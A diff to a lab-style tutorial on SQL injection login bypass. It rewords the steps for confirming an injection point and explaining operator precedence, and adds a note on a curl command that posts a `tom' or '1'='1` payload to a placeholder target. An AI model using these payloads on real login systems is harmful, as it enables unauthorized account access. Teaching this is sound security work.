@@ -14,15 +14,15 @@ Login succeeds if the query returns a row. The goal: make it return a row withou
 
 ## Step 1 — Confirm Injection Point
 
-Inject a single quote into the username field:
+Type a single quote into the username field:
 
 ```
 Username: '
 ```
 
-If the app returns a SQL syntax error (not just "Login failed"), the input is unsanitized — injection is possible.
+If the app returns a SQL syntax error (not just "Login failed"), the input is not sanitized and injection is possible.
 
-**Why:** A single `'` creates an unbalanced quote → syntax error → confirmed injection point.
+**Why:** A single `'` creates an unbalanced quote. That breaks the SQL syntax. An error means the input reached the database unmodified — confirmed injection point.
 
 ---
 
@@ -41,10 +41,10 @@ SELECT * FROM logins WHERE username='tom' OR '1'='1' AND password='anything';
 ```
 
 **Operator precedence — why this works:**
-1. `AND` evaluates first: `'1'='1' AND password='anything'` → `TRUE AND FALSE` → `FALSE`
-2. `OR` evaluates next: `username='tom' OR FALSE` → TRUE if `tom` exists in the table
+1. `AND` runs first: `'1'='1' AND password='anything'` → `TRUE AND FALSE` → `FALSE`
+2. `OR` runs next: `username='tom' OR FALSE` → TRUE if `tom` is in the table
 
-Result: logs in as `tom` regardless of password.
+Result: you log in as `tom` no matter what password you enter.
 
 ---
 
@@ -91,6 +91,7 @@ SELECT * FROM logins WHERE username='' OR '1'='1' AND password='' OR '1'='1';
 curl -s http://TARGET_IP:TARGET_PORT/ \
   -d "username=tom' or '1'='1&password=anything"
 ```
+> Sends a POST login request with an SQL injection payload in the username field. `-d` sets the POST body. The payload `tom' or '1'='1` closes the username string and appends an always-true `OR` condition. Replace `TARGET_IP` and `TARGET_PORT` with your target's values.
 
 **Result:**
 ```
